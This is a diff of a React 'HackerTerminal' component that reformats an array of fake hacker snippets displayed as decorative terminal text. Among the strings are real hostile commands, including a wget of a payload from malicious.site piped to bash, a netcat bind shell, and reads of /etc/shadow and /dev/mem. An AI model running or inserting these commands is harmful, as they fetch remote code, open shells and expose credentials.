@@ -1,33 +1,34 @@
 import React, { useEffect, useState, useRef } from "react";
 
 const fakeCodeSnippets = [
-  "#include <stdio.h>",
-  "#include <stdlib.h>",
-  "int main() {",
-  "    printf(\"Initializing backdoor access...\\n\");",
-  "    system(\"sudo echo 1 > /proc/sys/kernel/sysrq\");",
-  "    return 0;",
-  "}",
-  "echo '[+] Establishing SSH connection...'",
-  "ssh -o StrictHostKeyChecking=no root@192.168.1.100",
-  "nc -lvp 4444 -e /bin/bash",
-  "iptables -A INPUT -p tcp --dport 22 -j DROP",
-  "echo '[!] Encrypting payload...'",
-  "mov eax, 0x5A",
-  "xor ebx, ebx",
-  "int 0x80",
-  "jmp 0x08048534",
-  "cat /etc/shadow | grep root",
-  "chmod 777 /usr/bin/sudo",
-  "wget -qO- http://malicious.site/payload.sh | bash",
-  "echo '[+] Dumping memory contents...'",
-  "strings /dev/mem | grep password",
-  "su root",
-  "[KERNEL] Loading module: exploit.ko",
-  "[KERNEL] Overwriting sys_call_table...",
-  "[!] Segmentation fault at 0x00007fff...",
-  "[+] Writing shellcode to process memory...",
-];
+    "#include <stdio.h>",
+    "#include <stdlib.h>",
+    "int main() {",
+    '    printf("Initializing backdoor access...\\n");', // ✅ Correctly escaped
+    '    system("sudo echo 1 > /proc/sys/kernel/sysrq");', // ✅ Correctly escaped
+    "    return 0;",
+    "}",
+    "echo '[+] Establishing SSH connection...'",
+    "ssh -o StrictHostKeyChecking=no root@192.168.1.100",
+    "nc -lvp 4444 -e /bin/bash",
+    "iptables -A INPUT -p tcp --dport 22 -j DROP",
+    "echo '[!] Encrypting payload...'",
+    "mov eax, 0x5A",
+    "xor ebx, ebx",
+    "int 0x80",
+    "jmp 0x08048534",
+    "cat /etc/shadow | grep root",
+    "chmod 777 /usr/bin/sudo",
+    "wget -qO- http://malicious.site/payload.sh | bash",
+    "echo '[+] Dumping memory contents...'",
+    "strings /dev/mem | grep password",
+    "su root",
+    "[KERNEL] Loading module: exploit.ko",
+    "[KERNEL] Overwriting sys_call_table...",
+    "[!] Segmentation fault at 0x00007fff...",
+    "[+] Writing shellcode to process memory...",
+  ];
+  
 
 const HackerTerminal = () => {
   const [logs, setLogs] = useState(["root@server:~$ "]);
